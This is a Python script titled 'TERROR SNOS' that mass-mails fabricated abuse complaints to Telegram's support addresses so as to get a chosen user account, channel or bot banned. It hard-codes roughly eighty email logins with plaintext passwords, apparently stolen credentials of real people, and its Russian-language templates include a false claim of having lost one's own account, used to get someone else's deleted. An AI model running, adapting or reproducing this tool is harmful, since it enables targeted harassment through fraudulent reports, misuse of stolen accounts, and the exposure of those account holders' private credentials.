import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from fake_useragent import UserAgent
import requests
import random
from termcolor import colored
import pyfiglet
import socket
import datetime
import re
import time



banner = pyfiglet.figlet_format("TERROR SNOS")
color_banner = colored(banner, color= 'red')
device_name = socket.gethostname()
ip = socket.gethostbyname(device_name)
# time = datetime.datetime.now()

senders = {
    'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
    'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
    'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
'aria.therese.svensson@mail.com': 'Zorro1ab',
'taterbug@verizon.net': 'Holly1!',
'ejbrickner@comcast.net': 'Pass1178',
'teressapeart@cox.net': 'Quinton2329!',
'liznees@verizon.net': 'Dancer008',
'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
'kcdg@charter.net': 'Jennifer3*',
'bean_118@hotmail.com': 'Liverpool118!',
'dsdhjas@mail.com': 'LONGHACH123',
'robitwins@comcast.net': 'May241996',
'wasina@live.com': 'Marlas21',
'aruzhan.01@mail.com': '1234567!',
'rob.tackett@live.com': 'metallic',
'lindahallenbeck@verizon.net': 'Anakin@2014',
'hlaw82@mail.com': 'Snoopy37$$',
'paintmadman@comcast.net': 'mycat2200*',
'prideandjoy@verizon.net': 'Ihatejen12',
'sdgdfg56@mail.com': 'kenwood4201',
'garrett.danelz@comcast.net': 'N11golfer!',
'gillian_1211@hotmail.com': 'Gilloveu1211',
'sunpit16@hotmail.com': 'Putter34!',
'fdshelor@verizon.net': 'Masco123*',
'yeags1@cox.net': 'Zoomom1965!',
'amine002@usa.com': 'iScrRoXAei123',
'bbarcelo16@cox.net': 'Bsb161089$$',
'laliebert@hotmail.com': 'pirates2',
'vallen285@comcast.net': 'Delft285!1!',
'sierra12@email.com': 'tegen1111',
'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
'kmay@windstream.net': 'Nascar98',
'redbrick1@mail.com': 'Redbrick11',
'ivv9ah7f@mail.com': 'K226nw8duwg',
'erkobir@live.com': 'floydLAWTON019',
'Misscarter@mail.com': 'ashtray19',
'carlieruby10@cox.net': 'Lollypop789$',
'blackops2013@mail.com': 'amason123566',
'caroline_cullum@comcast.net': 'carter14',
'dpb13@live.com': 'Ic&ynum13',
'heirhunter@usa.com': 'Noguys@714',
'sherri.edwards@verizon.net': 'Dreaming123#',
'rami.rami1980@hotmail.com': 'ramirami1980',
'jmsingleton2@comcast.net': '151728Jn$$',
'aberancho@aol.com': '10diegguuss10',
'dgidel@iowatelecom.net': 'Buster48',
'gpopandopul@mail.com': 'GEORG62A',
'bolgodonsk@mail.com': '012345678!',
'colbycolb@cox.net': 'Signals@1',
'nicrey4@comcast.net': 'Dabears54',
'mordechai@mail.com': 'Mordechai',
'inemrzoya@mail.com': 'rLS1elaUrLS1elaU',
'tarabedford@comcast.net': 'Money4me',
'mycockneedsit@mail.com': 'benjamin3',
'saralaine@mail.com': 'sarlaine12!1',
'jonb2006@verizon.net': '1969Camaro',
'rjhssa1@verizon.net': 'Donna613*',
'cameron.doug@charter.net': 'Jake2122$',
'bridget.shappell@comcast.net': 'Brennan1',
'rugs8@comcast.net': 'baseball46',
'averyjacobs3@mail.com': '1960682644!',
'lstefanick@hotmail.com': 'Luv2dance2',
'bchavez123@mail.com': 'aadrianachavez',
'lukejamesjones@mail.com': 'tinkerbell1',
'emahoney123@comcast.net': 'Shieknmme3#',
'mandy10.mcevoy@btinternet.com': 'Tr1plets3',
'jet747@cox.net': 'Sadie@1234',
'landsgascareservices@mail.com': 'Alisha25@',
'samantha224@mail.com': 'Madden098!@',
'kbhamil@wowway.com': 'Carol1940',
'email@bjasper.com': 'Lhsnh4us123!',
'biggsbrian@cox.net': 'Trains@2247Trains@2247',
'dzzeblnd@aol.com': 'Geosgal@1',
'jtrego@indy.rr.com': 'Jackwill14!',
'chrisphonte.rj@comcast.net': 'Junior@3311',
'tvwifiguy@comcast.net': 'Bill#0101',
'defenestrador@mail.com': 'm0rb1d8ss',
'glangley@gmx.com': 'ironhide',
'charlotte2850@hotmail.com': 'kelalu2850'
}
receivers = ['sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
             'sticker@telegram.org', 'support@telegram.org']

def send_email(receiver, sender_email, sender_password, subject, body):
	try:
		msg = MIMEMultipart()
		msg['From'] = sender_email
		msg['To'] = receiver
		msg.attach(MIMEText(body, 'plain'))
		server = smtplib.SMTP('smtp.mail.ru', 587)
		server.starttls()
		server.login(sender_email, sender_password)
		server.sendmail(sender_email, receiver, msg.as_string())
		time.sleep(3)
		server.quit()
		return True
	except Exception as e:
		return False
		
def complaint():
	print(color_banner)
	print("[1] Снос аккаунта")
	print("[2] Снос канала")
	print("[3] Снос бота")
	print()
	print()
	choice = input(colored(">>>", "red"))


	if choice == '1':
		print("[1] Снос према")
		print("[2] Снос за вирт")
		print("[3] Снос сессии")
		print("[4] Снос за спам")
		comp_choice = input(colored(">>>", "red"))
        
		if comp_choice in ["1", "4"]:
			username = input("Введите юзернейм: ")
			id = input("Введите айди: ")
			comp_texts = {
               "1": f"Добрый день поддержка Telegram! Аккаунт {username} {id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram.Прошу проверить данную жалобу и принять меры!",
               "4": f"Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди - {id}. Пожалуйста примите меры по отношению к данному пользователю."
            }
			for sender_email, sender_password in senders.items():
				for receiver in receivers:
					comp_text = comp_texts[comp_choice]
					comp_body = comp_text.format(username=username.strip(), id=id.strip())
					send_email(receiver, sender_email, sender_password, 'Жалоба на аккаунт ', comp_body)
					print(f"Отправлено на {receiver} от {sender_email}!")
					time.sleep(1)
                    
		elif comp_choice == '3':
			username = input("Введите юзернейм: ")
			id = input("Ведите айди: ")
			number = input("Введите номер:")
			comp_texts = {
                "3": f"Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. Его юзернейм {username}, айди - {id}, номер - {number} Пожалуйста удалите аккаунт или обнулите сессии"
       	     }

			for sender_email, sender_password in senders.items():
				for receiver in receivers:
					comp_text = comp_texts[comp_choice]
					comp_body = comp_text.format(username=username.strip(), id=id.strip())
					send_email(receiver, sender_email, sender_password, 'Я утерял свой аккаунт в телеграм', comp_body)
					print(f"Отправлено на {receiver} от {sender_email}!")
					time.sleep(1)   
                    
		elif comp_choice in ["2"]:
			username = input("Введите юзернейм: ")
			id = input("Введите айди: ")
			comp_texts = {
				"2": f"Добрый день поддержка Telegram!Аккаунт {username} , {id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.Прошу разберитесь с этим. Заранее спасибо!"
			}
			for sender_email, sender_password in senders.items():
				for receiver in receivers:
					comp_text = comp_texts[comp_choice]
					comp_body = comp_text.format(username=username.strip(), id=id.strip())
					send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя телеграм', comp_body)
					print(f"Отправлено на {receiver} от {sender_email}!")
					time.sleep(1)
            
	elif choice == "2":
		print("[1] Снос за докс")
		print("[2] Снос прайса")
		ch_choice = input(colored(">>>", "red"))    
        
		if ch_choice in ["1", "2"]:
			channel_link = input("Введите ссылку на канал: ")
			channel_violation = input("Введите ссылку на нарушение: ")
			comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел канал, который распространяет личные данные невинных людей. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "2": f"Здравствуйте,уважаемый модератор телеграмм,хочу пожаловаться вам на канал,который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал:{channel_link} Ссылка на нарушение:{channel_violation} Просьба заблокировать данный канал."
            }

			for sender_email, sender_password in senders.items():
				for receiver in receivers:
					comp_text = comp_texts[ch_choice]
					comp_body = comp_text.format(channel_link=channel_link.strip(), channel_violation=channel_violation.strip)
					send_email(receiver, sender_email, sender_password, 'Жалоба на телеграм канал', comp_body)
					print(f"Отправлено на {receiver} от {sender_email}!")
					time.sleep(1)
                    
	elif choice == "3":
		print("Снос гб")
		bot_ch = input(colored(">>>", "red"))   
         
		if bot_ch == "1":
			bot_user = input("Введите юзернейм: ")
			print("погоди чут чут.")
			comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел бота, который осуществляет поиск по личным данным ваших пользователей. Ссылка на бота - {bot_user}. Пожалуйста разберитесь и заблокируйте данного бота."
                       }
			for sender_email, sender_password in senders.items():
				for receiver in receivers:
					comp_text = comp_texts[bot_ch]
					comp_body = comp_text.format(bot_user=bot_user.strip())
					send_email(receiver, sender_email, sender_password, 'Жалоба на бота телеграм', comp_body)
					print(f"Отправлено на {receiver} от {sender_email}!")
					time.sleep(1)
        
        
        
complaint()